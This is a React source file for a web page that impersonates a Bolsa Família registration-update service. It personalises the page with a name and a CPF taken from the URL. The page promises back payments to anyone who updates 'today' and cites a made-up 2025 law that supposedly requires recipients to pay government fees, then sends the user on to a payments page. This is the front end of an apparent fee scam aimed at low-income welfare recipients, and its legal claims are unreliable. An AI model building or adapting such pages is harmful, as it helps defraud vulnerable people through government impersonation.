import { ArrowLeft, Lock } from 'lucide-react';
import { useParams, useLocation } from 'wouter';
import { useEffect } from 'react';
import bolsaFamiliaImg from '@assets/bolsa webp.webp';

export default function AtualizacaoCadastral() {
  // Obter parâmetros da URL
  const params = useParams();
  const { nome, cpf } = params;
  const [, navigate] = useLocation();
  
  // Formatar o nome do usuário (capitalizar e adicionar "Olá, ")
  const formatName = (name: string | undefined) => {
    if (!name) return "Edson";
    
    // Decodificar o nome da URL
    const decodedName = decodeURIComponent(name);
    
    // Capitalizar cada palavra do nome
    const formattedName = decodedName
      .split(' ')
      .map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())
      .join(' ');
      
    return formattedName;
  };
  
  // Formatar o CPF no padrão brasileiro (XXX.XXX.XXX-XX)
  const formatCPF = (cpfValue: string | undefined) => {
    if (!cpfValue) return "381.764.755-72";
    
    // Remover caracteres não numéricos
    const numericCPF = cpfValue.replace(/\D/g, '');
    
    // Se o CPF não tiver 11 dígitos, retorna o padrão
    if (numericCPF.length !== 11) return "381.764.755-72";
    
    // Formatar como XXX.XXX.XXX-XX
    return numericCPF.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
  };

  const handleBackClick = () => {
    navigate('/');
  };

  const formattedDate = () => {
    const today = new Date();
    return today.toLocaleDateString('pt-BR');
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Cabeçalho com gradiente azul */}
      <header className="bg-gradient-to-r from-[#0066b3] to-[#03a9f4] text-white p-4 flex items-center">
        <button onClick={handleBackClick} className="mr-4">
          <ArrowLeft size={24} />
        </button>
        <div className="flex items-center">
          <div className="bg-white rounded-full p-1 mr-2 flex items-center justify-center">
            <Lock size={20} color="#0066b3" />
          </div>
          <span className="text-lg font-medium">Atualização cadastral</span>
        </div>
      </header>

      <div className="flex-1 p-6">
        <div className="flex justify-center mb-6">
          <img 
            src={bolsaFamiliaImg}
            alt="Logo Bolsa Família" 
            className="h-24 w-auto object-contain"
          />
        </div>

        <div className="mb-6">
          <div className="bg-[#fff9e6] p-4 border-l-4 border-[#ee8435] mb-6">
            <p className="text-gray-700 font-medium">
              Os usuários que atualizarem o cadastro HOJE ({formattedDate()}) terão direito de receber TODAS AS PARCELAS ATRASADAS e R$ 1.298,00 pelos próximos 2 meses, e R$ 600,00 nos outros meses do ano.
            </p>
          </div>

          <p className="text-gray-700 mb-6">
            De acordo com a nova Lei (nº 10.820/2025) imposta pelo governo, é exigido que as parcelas do Bolsa Família de 2025 só sejam pagas aos que contribuírem com as tarifas governamentais.
          </p>
          
          <button
            type="button"
            className="w-full py-4 bg-[#ee8435] text-white font-medium rounded-md hover:bg-[#df7426] uppercase"
            onClick={() => navigate('/parcelas-bolsa-familia')}
          >
            Continuar
          </button>
        </div>
      </div>
    </div>
  );
}